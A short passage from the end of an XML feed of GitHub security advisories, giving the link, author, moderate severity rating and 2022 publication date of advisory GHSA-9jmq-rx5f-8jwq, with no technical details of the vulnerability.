<li><a href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-10T17:51:53.000Z</published>
    </entry>
</feed>